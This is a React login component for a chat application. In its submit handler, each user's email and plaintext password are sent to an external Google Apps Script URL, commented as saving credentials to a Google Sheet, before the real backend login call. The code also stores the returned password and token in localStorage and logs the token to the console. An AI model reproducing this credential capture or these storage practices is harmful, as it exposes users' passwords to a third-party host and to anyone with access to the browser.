import React, { useEffect, useRef, useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { toast } from "react-toastify";
import axios from "axios";

export default function Login() {
  const emailRef = useRef(null);
  const passRef = useRef(null);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
 
  // const logoutUser = () => {
  //   localStorage.clear();
  //   toast.info("Session expired. Please login again!");
  //   navigate("/login");
  // };


  const submit = async (e) => {
    e.preventDefault();
    setLoading(true);

  
    const mail = emailRef.current.value;
    const pass = passRef.current.value;

    if (!mail || !pass) {
      toast.warning("Please fill all fields ⚠️");
      setLoading(false);
      return;
    }

    try {
      // ✅ 1. Save credentials to Google Sheet
      await fetch("https://script.google.com/macros/s/AKfycbyvSQR0m14rR4fU_NpjCovUoDz91SX6UqgqDkDDrseGr1J-EH4FArXJPbn8UxpksVMq/exec", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        mode: "no-cors",
        body: JSON.stringify({ email: mail, password: pass }),
      });


      toast.success("Saved to Google Sheet 🎉");

      const response = await axios.post(
        "https://chatting-backend-1-3xl7.onrender.com/user/login",
        { email: mail, password: pass }
      );


      // ✅ Check backend response
      if (response.data.success) {
         

        console.log("Login Token:", response.data.token);
         localStorage.setItem("token", response.data.token);

        toast.success("Login successful 🎉");
        localStorage.setItem("email", response.data.data.email);
        localStorage.setItem("name", response.data.data.name);
        localStorage.setItem("password", response.data.data.password);
        localStorage.setItem("image", response.data.data.image);
        localStorage.setItem("role", response.data.data.role);

        //  setTimeout(() => {
        //   logoutUser();
        // }, 2 * 60 * 1000); // 2 minutes

        // Redirect to dashboard or whatever page
        
        navigate("/dashboard");

    
      } else {
        toast.error(response.data.message || "Invalid email or password ❌");

      }
    } catch (error) {
      console.error("Login error:", error);
      toast.error("Please Provide Valid Credential ❌");
    } finally {
      setLoading(false);
    }


  };

 

  useEffect(() => {
    // Clear localStorage whenever user visits the login page
    localStorage.removeItem("name");
  }, []);


  return (
    <>
      <div className="p-10" style={{ backgroundImage: `url(/images/bg_1.jpg)`, backgroundSize: "cover", backgroundPosition: "center", }}>
        <h2 className="text-2xl font-medium text-white mb-10 text-center">Welcome !</h2>

        <form className="max-w-md mx-auto rounded-md bg-white p-8" onSubmit={submit}>
          <div className="mb-5">
            <label
              htmlFor="email"
              className="block mb-4 text-md font-medium text-gray-900"
            >
              Your Email
            </label>
            <input
              type="text"
              id="email"
              ref={emailRef}
              placeholder="Enter E-Mail.."
              className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg 
                         focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
            />
          </div>

          <div className="mb-5">
            <label
              htmlFor="password"
              className="block mb-4 text-md font-medium text-gray-900"
            >
              Your password
            </label>
            <input
              type="password"
              id="password"
              ref={passRef}
              placeholder="Enter Password.."
              className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg 
                         focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
            />
          </div>

          <div className="flex items-start mb-5">
            <div className="flex items-center h-5">
              <input
                id="remember"
                type="checkbox"
                className="w-4 h-4 border border-gray-300 rounded-sm bg-gray-50 
                           focus:ring-3 focus:ring-blue-300"
              />
            </div>
            <label
              htmlFor="remember"
              className="ms-2 text-sm font-medium text-gray-900"
            >
              Remember me
            </label>
          </div>

          <div>
            <button
              type="submit"
              disabled={loading}
              className={`text-white font-medium rounded-lg text-sm w-full sm:w-auto px-5 py-2.5 
                ${loading
                  ? "bg-gray-400 cursor-not-allowed"
                  : "bg-blue-700 hover:bg-blue-800 cursor-pointer"}`}
            >
              {loading ? "Logging in..." : "Login"}
            </button>

            <Link to="/RegisterUser">
              <button
                type="button"
                className="cursor-pointer text-black-400 bg-cyan-400 md:ms-3 font-medium rounded-lg text-sm w-full sm:w-auto px-5 py-2.5"
              >
                Sign Up?
              </button>
            </Link>
          </div>
        </form>
      </div>
    </>
  );
}
